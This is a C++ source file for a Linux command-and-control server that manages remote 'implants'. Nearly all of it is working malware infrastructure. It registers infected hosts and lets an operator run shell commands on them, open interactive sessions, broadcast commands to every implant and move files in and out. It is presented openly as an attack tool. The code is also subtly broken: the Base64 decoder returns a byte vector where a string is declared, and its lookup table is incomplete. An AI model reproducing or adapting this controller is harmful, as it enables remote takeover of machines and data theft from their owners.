// =============================================================================
// HYBRID C2 CONTROLLER - Linux Version
// =============================================================================

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <queue>
#include <thread>
#include <mutex>
#include <chrono>
#include <random>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <atomic>
#include <condition_variable>
#include <functional>
#include <memory>
#include <cstring>
#include <filesystem>
#include <fstream>

// Linux networking
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

namespace fs = std::filesystem;

// Type definitions for Linux
typedef int SOCKET;
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR (-1)
#define closesocket close

// =============================================================================
// JSON HELPERS
// =============================================================================

static std::string EscapeJSON(const std::string& str) {
    std::string result;
    for (char c : str) {
        switch (c) {
            case '"': result += "\\\""; break;
            case '\\': result += "\\\\"; break;
            case '\n': result += "\\n"; break;
            case '\r': result += "\\r"; break;
            case '\t': result += "\\t"; break;
            default: result += c;
        }
    }
    return result;
}

static std::string UnescapeJSON(const std::string& str) {
    std::string result;
    for (size_t i = 0; i < str.size(); i++) {
        if (str[i] == '\\' && i + 1 < str.size()) {
            switch (str[i + 1]) {
                case 'n': result += '\n'; i++; break;
                case 'r': result += '\r'; i++; break;
                case 't': result += '\t'; i++; break;
                case '"': result += '"'; i++; break;
                case '\\': result += '\\'; i++; break;
                default: result += str[i]; break;
            }
        } else {
            result += str[i];
        }
    }
    return result;
}

static std::string ExtractJSONValue(const std::string& json, const std::string& key) {
    std::string searchKey = "\"" + key + "\":\"";
    auto pos = json.find(searchKey);
    if (pos == std::string::npos) {
        searchKey = "\"" + key + "\": \"";
        pos = json.find(searchKey);
    }
    if (pos == std::string::npos) return "";
    
    pos += searchKey.size();
    auto endPos = json.find("\"", pos);
    if (endPos == std::string::npos) return "";
    
    return json.substr(pos, endPos - pos);
}

static std::string Base64EncodeStatic(const std::string& input) {
    static const char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string output;
    output.reserve(((input.size() + 2) / 3) * 4);

    for (size_t i = 0; i < input.size(); i += 3) {
        unsigned char b0 = static_cast<unsigned char>(input[i]);
        unsigned char b1 = (i + 1 < input.size()) ? static_cast<unsigned char>(input[i + 1]) : 0;
        unsigned char b2 = (i + 2 < input.size()) ? static_cast<unsigned char>(input[i + 2]) : 0;

        unsigned char c0 = static_cast<unsigned char>(b0 >> 2);
        unsigned char c1 = static_cast<unsigned char>(((b0 & 0x03) << 4) | (b1 >> 4));
        unsigned char c2 = static_cast<unsigned char>(((b1 & 0x0F) << 2) | (b2 >> 6));
        unsigned char c3 = static_cast<unsigned char>(b2 & 0x3F);

        output.push_back(alphabet[c0]);
        output.push_back(alphabet[c1]);
        output.push_back((i + 1 < input.size()) ? alphabet[c2] : '=');
        output.push_back((i + 2 < input.size()) ? alphabet[c3] : '=');
    }
    return output;
}

static std::string Base64DecodeStatic(const std::string& data) {
    static const int decodeTable[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    
    std::vector<uint8_t> result;
    int val = 0, valb = -8;
    
    for (char c : data) {
        if (c == '=') break;
        int idx = decodeTable[(unsigned char)c];
        if (idx == -1) continue;
        val = (val << 6) + idx;
        valb += 6;
        if (valb >= 0) {
            result.push_back((uint8_t)((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return result;
}

// =============================================================================
// IMPLANT SESSION
// =============================================================================

struct ImplantSession {
    std::string implantId;
    std::string hostname;
    std::string username;
    std::string ipAddress;
    std::string osVersion;
    std::string connectionType;
    SOCKET socket;
    std::chrono::system_clock::time_point lastSeen;
    std::chrono::system_clock::time_point connectedAt;
    bool isOnline;
    int sleepTime;
    int jitter;
    std::queue<std::string> pendingCommands;
    std::queue<std::string> commandResults;
};

// =============================================================================
// C2 CONTROLLER CLASS
// =============================================================================

class C2Controller {
private:
    std::string bindAddress;
    uint16_t bindPort;
    SOCKET tcpListener;
    
    std::map<std::string, std::shared_ptr<ImplantSession>> implants;
    std::mutex implantMutex;
    
    std::atomic<bool> isRunning{false};
    std::vector<std::thread> serverThreads;
    
    std::atomic<uint64_t> totalCommandsSent{0};
    std::atomic<uint64_t> totalBytesTransferred{0};
    std::chrono::system_clock::time_point startTime;
    
public:
    C2Controller(const std::string& bindAddr = "0.0.0.0", uint16_t port = 8443)
        : bindAddress(bindAddr), bindPort(port), tcpListener(INVALID_SOCKET) {
        startTime = std::chrono::system_clock::now();
    }
    
    bool Initialize() {
        std::cout << "\n[*] Initializing C2 Controller (Linux)...\n" << std::endl;
        
        tcpListener = socket(AF_INET, SOCK_STREAM, 0);
        if (tcpListener == INVALID_SOCKET) {
            perror("[!] Socket creation failed");
            return false;
        }
        
        // Allow reuse of address
        int optval = 1;
        setsockopt(tcpListener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
        
        sockaddr_in serverAddr = {0};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(bindPort);
        
        if (bindAddress == "0.0.0.0") {
            serverAddr.sin_addr.s_addr = INADDR_ANY;
        } else {
            inet_pton(AF_INET, bindAddress.c_str(), &serverAddr.sin_addr);
        }
        
        if (bind(tcpListener, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            perror("[!] Bind failed");
            close(tcpListener);
            return false;
        }
        
        if (listen(tcpListener, SOMAXCONN) < 0) {
            perror("[!] Listen failed");
            close(tcpListener);
            return false;
        }
        
        std::cout << "[+] TCP Listener started on " << bindAddress 
                  << ":" << bindPort << std::endl;
        
        return true;
    }
    
    void Start() {
        isRunning = true;
        
        std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║     C2 CONTROLLER v3.0 (Linux)                                ║
║     Type 'help' for commands                                  ║
╚═══════════════════════════════════════════════════════════════╝
)" << std::endl;
        
        // Start listener thread
        serverThreads.emplace_back(&C2Controller::ListenerThread, this);
        // Start heartbeat monitor
        serverThreads.emplace_back(&C2Controller::HeartbeatMonitor, this);
        
        // Interactive console
        InteractiveConsole();
    }
    
    void Shutdown() {
        std::cout << "\n[*] Shutting down...\n" << std::endl;
        isRunning = false;
        
        for (auto& pair : implants) {
            if (pair.second->isOnline) {
                close(pair.second->socket);
            }
        }
        
        if (tcpListener != INVALID_SOCKET) close(tcpListener);
        
        for (auto& thread : serverThreads) {
            if (thread.joinable()) thread.join();
        }
        
        std::cout << "[+] Shutdown complete" << std::endl;
    }
    
private:
    void ListenerThread() {
        while (isRunning) {
            sockaddr_in clientAddr;
            socklen_t addrLen = sizeof(clientAddr);
            
            SOCKET clientSocket = accept(tcpListener, 
                                        (sockaddr*)&clientAddr, &addrLen);
            
            if (clientSocket == INVALID_SOCKET) {
                if (isRunning) perror("[!] Accept failed");
                continue;
            }
            
            char ipStr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);
            
            std::cout << "\n[*] New connection from " << ipStr << std::endl;
            
            std::thread clientThread(&C2Controller::HandleClient, this, clientSocket, std::string(ipStr));
            clientThread.detach();
        }
    }
    
    void HandleClient(SOCKET clientSocket, const std::string& ip) {
        auto implant = PerformHandshake(clientSocket, ip, "TCP");
        if (!implant) {
            std::cerr << "[!] Handshake failed for " << ip << std::endl;
            close(clientSocket);
            return;
        }
        
        implant->socket = clientSocket;
        implant->isOnline = true;
        
        {
            std::lock_guard<std::mutex> lock(implantMutex);
            implants[implant->implantId] = implant;
        }
        
        std::cout << "[+] Implant registered: " << implant->hostname 
                  << " (" << implant->implantId << ")" << std::endl;
        
        CommunicationLoop(implant);
    }
    
    std::shared_ptr<ImplantSession> PerformHandshake(SOCKET socket, const std::string& ip, const std::string& connType) {
        char buffer[4096];
        int received = recv(socket, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0) return nullptr;
        
        buffer[received] = 0;
        std::string regData(buffer);
        
        auto implant = std::make_shared<ImplantSession>();
        implant->ipAddress = ip;
        implant->connectionType = connType;
        implant->connectedAt = std::chrono::system_clock::now();
        implant->lastSeen = implant->connectedAt;
        implant->sleepTime = 60;
        implant->jitter = 30;
        
        implant->implantId = ExtractJSONValue(regData, "id");
        implant->hostname = ExtractJSONValue(regData, "hostname");
        implant->username = ExtractJSONValue(regData, "username");
        implant->osVersion = ExtractJSONValue(regData, "os");
        
        std::string ack = "{\"status\":\"ok\",\"heartbeat\":30}";
        send(socket, ack.c_str(), ack.size(), 0);
        
        return implant;
    }
    
    void CommunicationLoop(std::shared_ptr<ImplantSession> implant) {
        char buffer[65536];
        
        while (isRunning && implant->isOnline) {
            fd_set readSet;
            FD_ZERO(&readSet);
            FD_SET(implant->socket, &readSet);
            
            timeval timeout = {1, 0};
            int result = select(implant->socket + 1, &readSet, NULL, NULL, &timeout);
            
            if (result > 0) {
                int received = recv(implant->socket, buffer, sizeof(buffer) - 1, 0);
                if (received <= 0) { implant->isOnline = false; break; }
                buffer[received] = 0;
                ProcessResponse(implant, std::string(buffer));
                totalBytesTransferred += received;
            }
            
            SendPendingCommands(implant);
        }
        
        close(implant->socket);
        implant->isOnline = false;
    }
    
    void ProcessResponse(std::shared_ptr<ImplantSession> implant, const std::string& response) {
        implant->lastSeen = std::chrono::system_clock::now();
        if (response.find("\"type\":\"heartbeat\"") != std::string::npos) return;
        
        if (response.find("\"type\":\"result\"") != std::string::npos) {
            std::string result = ExtractJSONValue(response, "data");
            result = UnescapeJSON(result);
            std::string decoded = Base64DecodeStatic(result);
            
            if (decoded.size() >= 5 && decoded.substr(0, 5) == "FILE:") {
                SaveDownloadedFile(decoded, implant->hostname);
            } else {
                implant->commandResults.push(decoded.empty() ? result : decoded);
            }
        }
    }
    
    bool SendFileUpload(std::shared_ptr<ImplantSession> implant, const std::string& localPath, const std::string& remotePath) {
        std::ifstream input(localPath, std::ios::binary);
        if (!input) {
            std::cout << "[!] Unable to read local file: " << localPath << std::endl;
            return false;
        }
        std::string contents((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
        input.close();

        std::string payload = "upload|" + remotePath + "|" + Base64EncodeStatic(contents);
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(payload) + "\"}";
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }

    bool SendFileDownload(std::shared_ptr<ImplantSession> implant, const std::string& remotePath, const std::string& localPath) {
        std::string payload = "download|" + remotePath + "|" + localPath;
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(payload) + "\"}";
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }

    void SaveDownloadedFile(const std::string& fileData, const std::string& hostname) {
        size_t pos1 = fileData.find(':', 5);
        size_t pos2 = fileData.find(':', pos1 + 1);
        
        if (pos1 == std::string::npos || pos2 == std::string::npos) {
            std::cout << "[!] Invalid file format" << std::endl;
            return;
        }
        
        std::string fileName = fileData.substr(5, pos1 - 5);
        std::string b64Data = fileData.substr(pos2 + 1);
        
        std::string downloadDir = "downloads/" + hostname;
        fs::create_directories(downloadDir);
        
        std::string savePath = downloadDir + "/" + fileName;
        std::string decoded = Base64DecodeStatic(b64Data);
        
        std::ofstream file(savePath, std::ios::binary);
        if (file) {
            file.write((char*)decoded.data(), decoded.size());
            file.close();
            std::cout << "\n[+] Downloaded: " << savePath 
                      << " (" << decoded.size() << " bytes)" << std::endl;
        }
    }
    
    void SendPendingCommands(std::shared_ptr<ImplantSession> implant) {
        while (!implant->pendingCommands.empty()) {
            std::string cmd = implant->pendingCommands.front();
            implant->pendingCommands.pop();
            SendCommand(implant, cmd);
        }
    }
    
    bool SendCommand(std::shared_ptr<ImplantSession> implant, const std::string& command) {
        std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(command) + "\"}";
        int sent = send(implant->socket, packet.c_str(), packet.size(), 0);
        totalBytesTransferred += sent;
        return sent == (int)packet.size();
    }
    
    void HeartbeatMonitor() {
        while (isRunning) {
            auto now = std::chrono::system_clock::now();
            std::lock_guard<std::mutex> lock(implantMutex);
            
            for (auto it = implants.begin(); it != implants.end();) {
                auto& implant = it->second;
                if (implant->isOnline) {
                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(
                        now - implant->lastSeen).count();
                    if (lastSeen > 300) {
                        std::cout << "[!] " << implant->hostname << " timed out" << std::endl;
                        close(implant->socket);
                        implant->isOnline = false;
                    }
                }
                if (!implant->isOnline) {
                    auto offline = std::chrono::duration_cast<std::chrono::hours>(
                        now - implant->lastSeen).count();
                    if (offline > 24) {
                        it = implants.erase(it);
                        continue;
                    }
                }
                ++it;
            }
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
    
    // =========================================================================
    // INTERACTIVE CONSOLE
    // =========================================================================
    
    void InteractiveConsole() {
        std::string input;
        
        while (isRunning) {
            std::cout << "\nC2> ";
            std::getline(std::cin, input);
            
            if (input.empty()) continue;
            
            std::vector<std::string> tokens = Tokenize(input);
            std::string cmd = tokens[0];
            
            if (cmd == "help") {
                ShowHelp();
            }
            else if (cmd == "list" || cmd == "implants") {
                ListImplants();
            }
            else if (cmd == "info") {
                if (tokens.size() >= 2) ImplantInfo(tokens[1]);
            }
            else if (cmd == "interact") {
                if (tokens.size() >= 2) InteractShell(tokens[1]);
            }
            else if (cmd == "exec") {
                if (tokens.size() >= 3) {
                    std::string target = tokens[1];
                    std::string command = input.substr(input.find(tokens[2]));
                    ExecuteCommand(target, command);
                }
            }
            else if (cmd == "upload") {
                if (tokens.size() >= 4) {
                    std::string target = tokens[1];
                    std::string localPath = tokens[2];
                    std::string remotePath = tokens[3];
                    UploadFile(target, localPath, remotePath);
                }
            }
            else if (cmd == "download") {
                if (tokens.size() >= 4) {
                    std::string target = tokens[1];
                    std::string remotePath = tokens[2];
                    std::string localPath = tokens[3];
                    DownloadFile(target, remotePath, localPath);
                }
            }
            else if (cmd == "broadcast") {
                if (tokens.size() >= 2) {
                    std::string command = input.substr(input.find(tokens[1]));
                    ExecuteCommand("all", command);
                }
            }
            else if (cmd == "stats") {
                ShowStatistics();
            }
            else if (cmd == "exit" || cmd == "quit") {
                Shutdown();
                break;
            }
            else {
                std::cout << "[!] Unknown: " << cmd << " (type 'help')" << std::endl;
            }
        }
    }
    
    void ShowHelp() {
        std::cout << R"(
Commands:
  list/implants                - List all connected implants
  info <id>                    - Show implant details
  interact <id>                - Interactive shell with implant
  exec <id> <command>          - Execute command on implant
  upload <id> <local> <remote> - Upload a file to the implant
  download <id> <remote> <local> - Download a file from the implant
  broadcast <command>          - Execute on all implants
  stats                        - Show statistics
  exit/quit                    - Shutdown controller
)" << std::endl;
    }
    
    void ListImplants() {
        std::lock_guard<std::mutex> lock(implantMutex);
        
        std::cout << "\n=== Active Implants ===\n";
        printf("%-8s %-20s %-15s %-15s %-8s %s\n", 
               "ID", "Hostname", "Username", "IP", "Conn", "Status");
        printf("%s\n", std::string(80, '-').c_str());
        
        for (auto& pair : implants) {
            auto& imp = pair.second;
            printf("%-8s %-20s %-15s %-15s %-8s %s\n",
                   imp->implantId.substr(0, 8).c_str(),
                   imp->hostname.substr(0, 20).c_str(),
                   imp->username.substr(0, 15).c_str(),
                   imp->ipAddress.c_str(),
                   imp->connectionType.c_str(),
                   imp->isOnline ? "ONLINE" : "OFFLINE");
        }
    }
    
    void ImplantInfo(const std::string& id) {
        std::lock_guard<std::mutex> lock(implantMutex);
        
        auto it = implants.find(id);
        if (it == implants.end()) {
            // Partial match
            for (auto& pair : implants) {
                if (pair.first.find(id) == 0) {
                    DisplayDetails(pair.second);
                    return;
                }
            }
            std::cout << "[!] Implant not found" << std::endl;
            return;
        }
        DisplayDetails(it->second);
    }
    
    void DisplayDetails(std::shared_ptr<ImplantSession> imp) {
        auto now = std::chrono::system_clock::now();
        auto uptime = std::chrono::duration_cast<std::chrono::hours>(now - imp->connectedAt).count();
        auto idle = std::chrono::duration_cast<std::chrono::seconds>(now - imp->lastSeen).count();
        
        std::cout << "\n=== " << imp->hostname << " ===\n";
        std::cout << "ID: " << imp->implantId << "\n";
        std::cout << "IP: " << imp->ipAddress << "\n";
        std::cout << "OS: " << imp->osVersion << "\n";
        std::cout << "Status: " << (imp->isOnline ? "ONLINE" : "OFFLINE") << "\n";
        std::cout << "Uptime: " << uptime << "h | Idle: " << idle << "s\n";
    }
    
    void InteractShell(const std::string& id) {
        std::shared_ptr<ImplantSession> imp;
        {
            std::lock_guard<std::mutex> lock(implantMutex);
            auto it = implants.find(id);
            if (it == implants.end()) {
                for (auto& pair : implants) {
                    if (pair.first.find(id) == 0) { imp = pair.second; break; }
                }
            } else {
                imp = it->second;
            }
        }
        
        if (!imp) { std::cout << "[!] Implant not found" << std::endl; return; }
        if (!imp->isOnline) { std::cout << "[!] Offline" << std::endl; return; }
        
        std::cout << "\n[*] Shell with " << imp->hostname << " (type 'exit' to return)\n";
        
        std::string cmd;
        while (isRunning && imp->isOnline) {
            std::cout << "[" << imp->hostname << "]> ";
            std::getline(std::cin, cmd);
            
            if (cmd == "exit" || cmd == "back" || cmd == "quit") break;
            if (cmd.empty()) continue;
            
            std::string packet = "{\"type\":\"command\",\"cmd\":\"" + EscapeJSON(cmd) + "\"}";
            send(imp->socket, packet.c_str(), packet.size(), 0);
            totalCommandsSent++;
            
            // Wait for response
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            
            while (!imp->commandResults.empty()) {
                std::cout << imp->commandResults.front() << std::endl;
                imp->commandResults.pop();
            }
        }
        
        std::cout << "\n[*] Returned to C2>\n";
    }
    
    void UploadFile(const std::string& targetId, const std::string& localPath, const std::string& remotePath) {
        std::lock_guard<std::mutex> lock(implantMutex);
        for (auto& pair : implants) {
            if (pair.first == targetId || pair.first.find(targetId) == 0) {
                if (pair.second->isOnline && SendFileUpload(pair.second, localPath, remotePath)) {
                    std::cout << "[+] Upload queued for " << pair.second->hostname << "\n";
                }
                return;
            }
        }
        std::cout << "[!] Implant not found\n";
    }

    void DownloadFile(const std::string& targetId, const std::string& remotePath, const std::string& localPath) {
        std::lock_guard<std::mutex> lock(implantMutex);
        for (auto& pair : implants) {
            if (pair.first == targetId || pair.first.find(targetId) == 0) {
                if (pair.second->isOnline && SendFileDownload(pair.second, remotePath, localPath)) {
                    std::cout << "[+] Download queued for " << pair.second->hostname << "\n";
                }
                return;
            }
        }
        std::cout << "[!] Implant not found\n";
    }

    void ExecuteCommand(const std::string& targetId, const std::string& command) {
        std::lock_guard<std::mutex> lock(implantMutex);
        
        if (targetId == "all" || targetId == "*") {
            for (auto& pair : implants) {
                if (pair.second->isOnline)
                    pair.second->pendingCommands.push(command);
            }
            std::cout << "[+] Broadcast to " << implants.size() << " implants\n";
            return;
        }
        
        for (auto& pair : implants) {
            if (pair.first == targetId || pair.first.find(targetId) == 0) {
                if (pair.second->isOnline) {
                    pair.second->pendingCommands.push(command);
                    std::cout << "[+] Sent to " << pair.second->hostname << "\n";
                }
                return;
            }
        }
        std::cout << "[!] Implant not found\n";
    }
    
    void ShowStatistics() {
        auto now = std::chrono::system_clock::now();
        auto uptime = std::chrono::duration_cast<std::chrono::hours>(now - startTime).count();
        
        std::cout << "\n=== Statistics ===\n";
        std::cout << "Uptime: " << uptime << " hours\n";
        std::cout << "Implants: " << implants.size() << "\n";
        std::cout << "Commands: " << totalCommandsSent << "\n";
        std::cout << "Data: " << (totalBytesTransferred / 1024) << " KB\n";
    }
    
    static std::vector<std::string> Tokenize(const std::string& input) {
        std::vector<std::string> tokens;
        std::istringstream iss(input);
        std::string token;
        while (iss >> token) tokens.push_back(token);
        return tokens;
    }
};

// =============================================================================
// MAIN
// =============================================================================

int main(int argc, char* argv[]) {
    std::string bindAddr = "0.0.0.0";
    uint16_t port = 8443;
    
    if (argc >= 2) bindAddr = argv[1];
    if (argc >= 3) port = (uint16_t)std::stoi(argv[2]);
    
    C2Controller controller(bindAddr, port);
    
    if (!controller.Initialize()) {
        std::cerr << "[!] Failed to initialize" << std::endl;
        return 1;
    }
    
    controller.Start();
    return 0;
}